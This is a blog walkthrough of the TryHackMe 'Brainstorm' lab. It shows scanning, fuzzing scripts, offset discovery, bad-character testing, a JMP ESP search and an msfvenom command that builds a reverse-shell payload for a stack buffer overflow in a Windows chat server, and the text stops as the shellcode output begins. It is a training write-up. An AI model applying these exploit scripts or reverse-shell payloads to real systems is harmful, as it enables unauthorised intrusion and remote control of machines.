---
layout: post
title: THM — Brainstorm
date: 2022-10-04 01:00:00 -500
categories: [TryHackMe]
tags: [Windows, Buffer Overflow, Reverse Engineering]
---

<img src="/assets/images/THM/Brainstorm/logo.jpeg" width="20%">

***

<center><strong><font color="White">Reverse engineer a chat program and write a script to exploit a Windows machine.</font></strong></center>

***

## <strong><font color="#34A5DA">Reccon</font></strong>

```
vladislav@Mac ~ % nmap -sV -sC -Pn 10.10.117.25
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-02 10:38 MSK
Nmap scan report for 10.10.117.25
Host is up (0.068s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2022-10-02T07:41:37+00:00
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2022-10-01T07:31:53
|_Not valid after:  2023-04-02T07:31:53
|_ssl-date: 2022-10-02T07:42:08+00:00; 0s from scanner time.
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.93%I=7%D=10/2%Time=63394019%P=arm-apple-darwin21.6.0%r
SF:(NULL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20en
SF:ter\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequ
SF:est,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ente
SF:r\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20
SF:message:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x2
SF:0\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20charac
SF:ters\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome
SF:\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20us
SF:ername\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%
SF:r(JavaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x
SF:20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x2
SF:0a\x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20
SF:chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x2
SF:0characters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcom
SF:e\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20u
SF:sername\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")
SF:%r(RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease
SF:\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\
SF:x20a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brai
SF:nstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(ma
SF:x\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReq
SF:uestTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20
SF:enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a
SF:\x20message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
SF:s\):\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\
SF:x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\
SF:x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Termi
SF:nalServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPl
SF:ease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Wr
SF:ite\x20a\x20message:\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 243.12 seconds
```

***

## <strong><font color="#34A5DA">Accessing Files</font></strong>

On port 21 we can see Anonymous FTP. Let's see what we have there. I used Finder as a guest to connect to FTP.

<img src="/assets/images/THM/Brainstorm/1.png" width="30%">

> What is the name of the exe file you found? `chatserver.exe`

***

## <strong><font color="#34A5DA">Access</font></strong>

After enumeration, you now must have noticed that the service interacting on the strange port is some how related to the files you found! Is there anyway you can exploit that strange service to gain access to the system? 

It is worth using a Python script to try out different payloads to gain access! You can even use the files to locally try the exploit.

***

First, we need to download and install Immunity Debugger with Mona plugin.

Then, open chatserver.exe in Immunity Debugger and run it.

I did it in VM Windows 11 on Mac OS. So, to be sure the server is running I ran basic nmap scan. To get the IP of our virtual machine run `ipconfig` in Windows Command Promt.

```
vladislav@Mac ~ % nmap -Pn 10.211.55.3
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-04 22:11 MSK
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 1.25% done; ETC: 22:19 (0:07:54 remaining)
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.75% done; ETC: 22:18 (0:07:04 remaining)
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.25% done; ETC: 22:18 (0:06:30 remaining)
Stats: 0:02:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 30.00% done; ETC: 22:18 (0:04:42 remaining)
Stats: 0:03:28 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 51.75% done; ETC: 22:18 (0:03:14 remaining)
Nmap scan report for windows-11.shared (10.211.55.3)
Host is up (0.0017s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 272.74 seconds
```

We see that this ChatServer is running on port 9999 (the same port it's running on target machine). Let's try to buffer overflow name or message. I din't manage to type manually too many `A`'s as my input was limited maybe by terminal. Instead of this, we can use python and forward it's output to the server.

```bash
python3 -c 'print("A" * 1000)' | netcat 10.211.55.3 9999 
```

<img src="/assets/images/THM/Brainstorm/2.png" width="80%">

<img src="/assets/images/THM/Brainstorm/3.png" width="80%">

We do not see any buffer overflow, so we need to increase the amount of `A`'s. Gradually trying 2000, 3000, 4000, 5000 we can find that using 5000 command promts output part of our name as our message.

<img src="/assets/images/THM/Brainstorm/4.png" width="80%">

Now let's try the same with message. However, I don't know how to redirect two output's, and because of this let's use fuzzer script.

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.211.55.3"
port = 9999
timeout = 5

# Creating buffers with different amounts of A's
buffer = []
counter = 1000
while len(buffer) < 40:
  buffer.append(b"A" * counter)
  counter += 100

# Fuzzing
for string in buffer:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((ip, port))
    s.recv(1024)
    s.recv(1024)
    print("Fuzzing with %s bytes" % len(string))
    s.send(b"username \r\n")
    s.recv(1024)
    s.send(string + b"\r\n")
    s.recv(1024)
    s.close()
  except:
    print("Could not connect to " + ip + ":" + str(port))
    sys.exit(0)
  time.sleep(1)
```

<img src="/assets/images/THM/Brainstorm/5.png" width="80%">

We can see that the server crashed and EIP consists of `A`'s:

<img src="/assets/images/THM/Brainstorm/6.png" width="80%">

Now we know that we can crash the server and overwrite the EIP with our string of `A`'s. However, we need to know how many bytes we need to send in our string to get the EIP.

Using metasploit framework we can create a unique string:
```bash
┌──(simpuar㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ ./pattern_create.rb -l 3000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
```

Now we need to add this string to `buffer` and run the script.

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.211.55.3"
port = 9999
timeout = 5

# Creating buffers with different amounts of A's
buffer = []
buffer.append(b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9")
#counter = 1000
#while len(buffer) < 40:
#  buffer.append(b"A" * counter)
#  counter += 100

# Fuzzing
for string in buffer:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((ip, port))
    s.recv(1024)
    s.recv(1024)
    print("Fuzzing with %s bytes" % len(string))
    s.send(b"username \r\n")
    s.recv(1024)
    s.send(string + b"\r\n")
    s.recv(1024)
    s.close()
  except:
    print("Could not connect to " + ip + ":" + str(port))
    sys.exit(0)
  time.sleep(1)
```

Running this script we crash the server and EIP is `31704330`.

<img src="/assets/images/THM/Brainstorm/7.png" width="80%">

Now we can get the offset by querying the string looking for EIP value:
```
└─$ msf-pattern_offset -l 3000 -q 31704330
[*] Exact match at offset 2012
```

We found that the offset is `2012`.

Next we should check if we can really overwrite the EIP with our custom string using this offset.

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.211.55.3"
port = 9999
timeout = 5
offset = 2012


buffer = []
s1 = ""
s1 += "A" * offset
s1 += "B" * 4
s1 += "C" * 3000 * len(s1)
buffer.append(bytes(s1, 'utf-8'))

# Fuzzing
for string in buffer:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    connect = s.connect((ip, port))
    s.recv(1024)
    s.recv(1024)
    print("Fuzzing with %s bytes" % len(string))
    s.send(b"username \r\n")
    s.recv(1024)
    s.send(string + b"\r\n")
    s.recv(1024)
    s.close()
  except:
    print("Could not connect to " + ip + ":" + str(port))
    sys.exit(0)
  time.sleep(1)
```

<img src="/assets/images/THM/Brainstorm/8.png" width="80%">

We can see that we managed to overwrite EIP with `BBBB`.

Next we should check for any bad chars. We can do this by passing a string of bad chars in hex:

```python
#!/usr/bin/env python3

import socket, sys

ip = "10.211.55.3"
port = 9999
username = b'username'
payload_length = 3000
offset = 2012
badchars = ( b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
payload = b'A' * offset + b'B' * 4

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  s.recv(1024)
  s.recv(1024)

  print("Sending username")
  s.send(username + b'\r\n')

  s.recv(1024)

  print("Sending payload")
  s.send(payload + badchars + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

After sending we need to right click the `ESP` value and click on "Follow in Dump":

<img src="/assets/images/THM/Brainstorm/9.png" width="80%">

Looking at this hex dump we can see that there is every bad char except for `\x00` because we didn't include it.

Now we need to review the chatserver for any function where ASLR/DEP is not enabled.

Run `!mona modules` in Immunity Debugger:

<img src="/assets/images/THM/Brainstorm/10.png" width="80%">

From the above we can see that ASLR is not enabled for both `chatserver.exe` and `essfunc.dll`. 

We want to divert the programs usual code flow to somewhere else in memory that we contorl. Since this program isn't compiled with ASLR we don't need to worry about the initial memory address being randomized. So we can find the bytecode for  `JMP ESP` using mona and overwrite our EIP with the address. This will allow us to execute any code that follows that.

```
!mona jmp -r esp -cpb "\x00"
```

<img src="/assets/images/THM/Brainstorm/11.png" width="80%">

We can use the first entry from the above. We should replace our playload with the hex address `625014F` reverse to `\xdf\x14\x50\x62` and remove badchars.

Moreover; we need to generate a shellcode using msfvenom:

```
vladislav@Mac Desktop % msfvenom -p windows/shell_reverse_tcp LHOST=10.18.7.222 LPORT=4444 -b "\x00" -f c     
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xbb\xd1\xa0\x0e\x79\xdb\xcc\xd9\x74\x24\xf4\x5a\x29\xc9"
